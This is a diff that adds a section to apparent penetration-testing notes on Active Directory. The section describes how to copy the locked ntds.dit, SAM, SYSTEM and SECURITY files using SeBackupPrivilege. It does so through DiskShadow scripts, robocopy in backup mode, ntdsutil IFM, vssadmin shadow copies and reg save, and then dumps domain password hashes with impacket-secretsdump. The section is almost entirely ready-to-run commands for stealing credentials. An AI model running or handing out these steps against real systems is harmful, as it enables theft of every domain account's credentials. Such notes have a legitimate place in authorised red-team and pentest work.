@@ -715,3 +715,78 @@ Get-DomainComputer -TrustedToAuth
 
 delegation findings can create Kerberos attack paths
 
+
+---
+
+## ntds.dit copy 
+
+`SeBackupPrivilege` -> Shadow Copy
+- allow for copying of locked files such as: 
+	- `C:\Windows\NTDS\ntds.dit`  
+	- `C:\Windows\System32\config\SAM`  
+	- `C:\Windows\System32\config\SYSTEM`  
+	- `C:\Windows\System32\config\SECURITY`
+
+```powershell
+# Create a DiskShadow Script
+"set context persistent nowriters" | Set-Content C:\Windows\Temp\diskshadow.txt
+"add volume c: alias osdrive" | Add-Content C:\Windows\Temp\diskshadow.txt
+"create" | Add-Content C:\Windows\Temp\diskshadow.txt
+"expose %osdrive% z:" | Add-Content C:\Windows\Temp\diskshadow.txt
+
+# Review the script
+type C:\Windows\Temp\diskshadow.txt
+set context persistent nowriters  
+add volume c: alias osdrive  
+create  
+expose %osdrive% z:
+
+# Run DiskShadow
+diskshadow /s C:\Windows\Temp\diskshadow.txt
+The shadow copy was successfully exposed as z:\.
+
+# Copy Locked Files from the Shadow Copy 
+# e.g. domain controller, copy `ntds.dit`
+robocopy /b Z:\Windows\NTDS C:\Windows\Temp ntds.dit
+# OR from PS
+cmd /c robocopy /b Z:\Windows\NTDS 
+# IF impacket PS 
+download "c:\windows\temp\ntds.dit"
+```
+
+```
+# Save the SYSTEM hive:
+C:\Tools>reg.exe save hklm\system c:\system.bak
+```
+
+other ways to save ntds
+
+```powershell
+# shadow copy path pre-existent
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" "C:\Windows\Temp\ntds.dit"
+
+# Create IFM copy with `ntdsutil`
+
+mkdir C:\Windows\Temp\ntds
+
+ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\ntds" quit quit
+
+copy "C:\Windows\Temp\ntds\Active Directory\ntds.dit" "C:\Windows\Temp\ntds.dit"
+```
+
+```powershell
+# creating a shadow manually
+vssadmin create shadow /for=C:
+vssadmin list shadows
+
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\ntds.dit" "C:\Windows\Temp\ntds.dit"  
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\Config\SYSTEM" "C:\Windows\Temp\SYSTEM"
+```
+
+
+```bash
+└─$ impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
+```
+
+
+
